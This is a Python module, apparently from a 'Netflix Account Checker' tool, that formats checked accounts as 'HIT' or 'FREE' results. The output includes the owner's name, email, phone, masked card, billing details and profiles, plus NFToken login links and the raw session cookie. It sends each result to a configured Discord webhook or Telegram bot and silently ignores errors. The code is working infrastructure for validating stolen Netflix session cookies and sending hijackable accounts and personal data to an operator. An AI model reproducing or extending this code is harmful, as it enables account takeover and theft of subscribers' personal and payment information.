"""Discord / Telegram notifications and output formatting."""

from __future__ import annotations

import json
from typing import Any, Dict, List, Optional

import requests

from .config import get_nftoken_mode, should_add_emojis
from .nftoken import build_nftoken_links, has_usable_nftoken
from .plans import derive_plan_info
from .utils import (
    format_country_with_flag,
    format_display_date,
    format_member_since,
    normalize_output_value,
)

DISCORD_USERNAME = "Netflix Account Checker"

LABEL_EMOJIS = {
    "Status": "📌",
    "Name": "👤",
    "Email": "📧",
    "Country": "🌍",
    "Plan": "📦",
    "Member Since": "📅",
    "Next Billing": "🗓️",
    "Payment": "💳",
    "Card": "💳",
    "Phone": "📱",
    "Quality": "🎞️",
    "Streams": "📺",
    "Price": "💰",
    "Hold Status": "⏸️",
    "Extra Member": "👥",
    "Email Verified": "✅",
    "Membership Status": "🛡️",
    "Profiles": "🎭",
    "User GUID": "🆔",
    "Valid Till (UTC)": "⏳",
}


def decorate_label(label: str, enabled: bool = True) -> str:
    if not enabled:
        return label
    key = "Profiles" if label.startswith("Profiles (") else label
    emoji = LABEL_EMOJIS.get(key)
    return f"{emoji} {label}" if emoji else label


def is_plan_allowed(channel_cfg: Dict, plan_key: str) -> bool:
    plans_value = (channel_cfg or {}).get("plans", "all")
    if plans_value is None:
        return True
    if isinstance(plans_value, str):
        normalized = plans_value.strip().lower()
        if normalized in {"", "all", "*"}:
            return True
        allowed = {x.strip().lower() for x in normalized.split(",") if x.strip()}
        return (plan_key or "").lower() in allowed
    if isinstance(plans_value, (list, tuple, set)):
        allowed = {str(x).strip().lower() for x in plans_value if str(x).strip()}
        return True if not allowed else (plan_key or "").lower() in allowed
    return True


def build_account_detail_lines(
    config: Dict,
    info: Dict,
    is_subscribed: bool,
    use_emojis: bool = False,
    include_country_flag: bool = True,
    show_all: bool = True,
) -> List[str]:
    """Build human-readable account lines.

    show_all=True (default for personal testing): always include every enabled
    field, even when value is UNKNOWN / N/A, so console + output are complete.
    """
    txt_fields = config.get("txt_fields", {})
    _, plan_label = derive_plan_info(info, is_subscribed)
    country = info.get("countryOfSignup")
    rendered_country = (
        format_country_with_flag(country)
        if include_country_flag
        else normalize_output_value(country)
    )
    values = {
        "name": normalize_output_value(info.get("accountOwnerName")),
        "email": normalize_output_value(info.get("email")),
        "country": rendered_country,
        "plan": normalize_output_value(plan_label),
        "member_since": format_member_since(info.get("memberSince")),
        "next_billing": format_display_date(info.get("nextBillingDate")),
        "payment_method": normalize_output_value(
            info.get("paymentMethodType"), na_when_false=True
        ),
        "card": normalize_output_value(
            info.get("maskedCard"), unknown_fallback="N/A", na_when_false=True
        ),
        "phone": normalize_output_value(info.get("phoneDisplay")),
        "quality": normalize_output_value(info.get("videoQuality")),
        "max_streams": normalize_output_value(
            str(info.get("maxStreams") or "").rstrip("}")
        ),
        "plan_price": normalize_output_value(
            info.get("planPrice"), unknown_fallback="N/A"
        ),
        "hold_status": normalize_output_value(info.get("holdStatus")),
        "extra_members": normalize_output_value(info.get("showExtraMemberSection")),
        "email_verified": normalize_output_value(info.get("emailVerified")),
        "membership_status": normalize_output_value(info.get("membershipStatus")),
        "profiles": normalize_output_value(info.get("profilesDisplay")),
        "user_guid": normalize_output_value(info.get("userGuid")),
    }
    labels = [
        ("name", "Name"),
        ("email", "Email"),
        ("country", "Country"),
        ("plan", "Plan"),
        ("member_since", "Member Since"),
        ("next_billing", "Next Billing"),
        ("payment_method", "Payment"),
        ("card", "Card"),
        ("phone", "Phone"),
        ("quality", "Quality"),
        ("max_streams", "Streams"),
        ("plan_price", "Price"),
        ("hold_status", "Hold Status"),
        ("extra_members", "Extra Member"),
        ("email_verified", "Email Verified"),
        ("membership_status", "Membership Status"),
        ("profiles", "Profiles"),
        ("user_guid", "User GUID"),
    ]
    lines = []
    for key, label in labels:
        # Respect config toggles; default True if missing
        if not txt_fields.get(key, True):
            continue
        # Compact mode (original style): hide sparse / free-only fields
        if not show_all:
            free_hidden = {
                "member_since",
                "next_billing",
                "payment_method",
                "card",
                "phone",
                "quality",
                "max_streams",
                "plan_price",
                "extra_members",
                "membership_status",
            }
            if not is_subscribed and key in free_hidden:
                continue
            if key == "card" and str(values.get("payment_method", "")).upper() != "CC":
                continue
            if key == "extra_members" and values.get(key) != "Yes":
                continue
            if key == "hold_status" and values.get(key) not in {"Yes", "No"}:
                continue
        rendered = label
        if key == "profiles" and info.get("profileCount"):
            rendered = f"Profiles ({info['profileCount']})"
        if use_emojis:
            rendered = decorate_label(rendered, True)
        lines.append(f"{rendered}: {values[key]}")
    return lines


def format_cookie_file(
    info: Dict,
    cookie_content: str,
    config: Dict,
    is_subscribed: bool,
    nftoken_data: Optional[Dict] = None,
) -> str:
    mode = get_nftoken_mode(config)
    use_emojis = should_add_emojis(config, "txt")
    divider = "-" * 72
    lines = [f"NETFLIX {'HIT' if is_subscribed else 'FREE'}", ""]
    lines.extend(
        build_account_detail_lines(
            config,
            info,
            is_subscribed,
            use_emojis=use_emojis,
            include_country_flag=False,
        )
    )
    if is_subscribed and mode != "false" and has_usable_nftoken(nftoken_data):
        lines.extend(["", divider, "", "NFToken", ""])
        lines.append(f"NFToken: {nftoken_data['token']}")
        for label, link in build_nftoken_links(nftoken_data.get("token"), mode):
            lines.append(f"{label}: {link}")
        if nftoken_data.get("expires_at_utc"):
            lines.append(f"Valid Till (UTC): {nftoken_data['expires_at_utc']}")
    lines.extend(["", divider, "", "COOKIE", "", cookie_content.strip(), ""])
    return "\n".join(lines)


def build_notification_details(
    config: Dict, info: Dict, is_subscribed: bool
) -> List[str]:
    status = "Subscribed" if is_subscribed else "Working (No Subscription)"
    if not is_subscribed:
        _, plan_label = derive_plan_info(info, is_subscribed)
        profiles = normalize_output_value(info.get("profilesDisplay"))
        count = info.get("profileCount")
        profile_label = f"Profiles ({count})" if count else "Profiles"
        lines = [
            f"Name: {normalize_output_value(info.get('accountOwnerName'))}",
            f"Email: {normalize_output_value(info.get('email'))}",
            f"Country: {format_country_with_flag(info.get('countryOfSignup'))}",
            f"Plan: {normalize_output_value(plan_label)}",
            f"Email Verified: {normalize_output_value(info.get('emailVerified'))}",
            f"{profile_label}: {profiles}",
        ]
    else:
        lines = build_account_detail_lines(config, info, is_subscribed)
    return [f"Status: {status}"] + lines


def _escape_html(text: Any) -> str:
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def build_discord_message(
    config: Dict,
    info: Dict,
    is_subscribed: bool,
    nftoken_data: Optional[Dict] = None,
    use_emojis: bool = True,
) -> str:
    lines = ["**Netflix Account Check**", "", "Cookie details"]
    for line in build_notification_details(config, info, is_subscribed):
        if ":" in line:
            label, value = line.split(":", 1)
            label = decorate_label(label.strip(), use_emojis)
            lines.append(f"{label}: {value.strip()}")
        else:
            lines.append(line)
    mode = get_nftoken_mode(config)
    if is_subscribed and mode != "false" and has_usable_nftoken(nftoken_data):
        lines.extend(["", "NFToken"])
        for label, link in build_nftoken_links(nftoken_data.get("token"), mode):
            lines.append(f"{label}: {link}")
    return "\n".join(lines)


def build_telegram_message(
    config: Dict,
    info: Dict,
    is_subscribed: bool,
    nftoken_data: Optional[Dict] = None,
    use_emojis: bool = True,
) -> str:
    lines = ["<b>Netflix Account Check</b>", "", "<b>Cookie details</b>"]
    for line in build_notification_details(config, info, is_subscribed):
        if ":" in line:
            label, value = line.split(":", 1)
            label = decorate_label(label.strip(), use_emojis)
            lines.append(f"<b>{_escape_html(label)}</b>: {_escape_html(value.strip())}")
        else:
            lines.append(_escape_html(line))
    mode = get_nftoken_mode(config)
    if is_subscribed and mode != "false" and has_usable_nftoken(nftoken_data):
        lines.extend(["", "<b>NFToken</b>"])
        for label, link in build_nftoken_links(nftoken_data.get("token"), mode):
            lines.append(f"{_escape_html(label)}: {_escape_html(link)}")
    return "\n".join(lines)


def send_discord_webhook(
    webhook_url: str,
    message_text: str,
    file_name: Optional[str] = None,
    file_content: Optional[str] = None,
) -> None:
    if not webhook_url:
        return
    payload = {
        "username": DISCORD_USERNAME,
        "content": message_text[:1900],
    }
    try:
        if file_name and file_content is not None:
            data = {"payload_json": json.dumps(payload)}
            files = {"file": (file_name, file_content.encode("utf-8"), "text/plain")}
            requests.post(webhook_url, data=data, files=files, timeout=20)
        else:
            requests.post(webhook_url, json=payload, timeout=20)
    except Exception:
        pass


def send_telegram(
    bot_token: str,
    chat_id: str,
    message_text: str,
    file_name: Optional[str] = None,
    file_content: Optional[str] = None,
) -> None:
    if not bot_token or not chat_id:
        return
    try:
        if file_name and file_content is not None:
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            data = {"chat_id": chat_id, "caption": message_text[:1000], "parse_mode": "HTML"}
            files = {"document": (file_name, file_content.encode("utf-8"))}
            requests.post(url, data=data, files=files, timeout=20)
        else:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": message_text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }
            requests.post(url, json=payload, timeout=20)
    except Exception:
        pass


def send_notifications(
    config: Dict,
    info: Dict,
    is_subscribed: bool,
    plan_key: str,
    output_filename: str,
    cookie_content: str,
    nftoken_data: Optional[Dict] = None,
) -> None:
    notifications = config.get("notifications", {})
    webhook_cfg = notifications.get("webhook", {})
    telegram_cfg = notifications.get("telegram", {})
    use_emojis = should_add_emojis(config, "webhook")
    webhook_mode = str(webhook_cfg.get("mode", "full")).lower()
    telegram_mode = str(telegram_cfg.get("mode", "full")).lower()

    if webhook_cfg.get("enabled") and is_plan_allowed(webhook_cfg, plan_key):
        if webhook_mode == "cookie":
            msg = f"**Cookie file:** `{output_filename}`\n```\n{cookie_content[:1500]}\n```"
            send_discord_webhook(webhook_cfg.get("url", ""), msg)
        elif webhook_mode == "nftoken":
            msg = build_discord_message(
                config, info, is_subscribed, nftoken_data, use_emojis
            )
            send_discord_webhook(webhook_cfg.get("url", ""), msg)
        else:
            msg = build_discord_message(
                config, info, is_subscribed, nftoken_data, use_emojis
            )
            send_discord_webhook(
                webhook_cfg.get("url", ""),
                msg,
                output_filename,
                cookie_content,
            )

    if telegram_cfg.get("enabled") and is_plan_allowed(telegram_cfg, plan_key):
        if telegram_mode == "cookie":
            msg = f"<b>Cookie:</b> {_escape_html(output_filename)}\n<pre>{_escape_html(cookie_content[:1500])}</pre>"
            send_telegram(
                telegram_cfg.get("bot_token", ""),
                telegram_cfg.get("chat_id", ""),
                msg,
            )
        else:
            msg = build_telegram_message(
                config, info, is_subscribed, nftoken_data, use_emojis
            )
            send_telegram(
                telegram_cfg.get("bot_token", ""),
                telegram_cfg.get("chat_id", ""),
                msg,
                output_filename if telegram_mode == "full" else None,
                cookie_content if telegram_mode == "full" else None,
            )
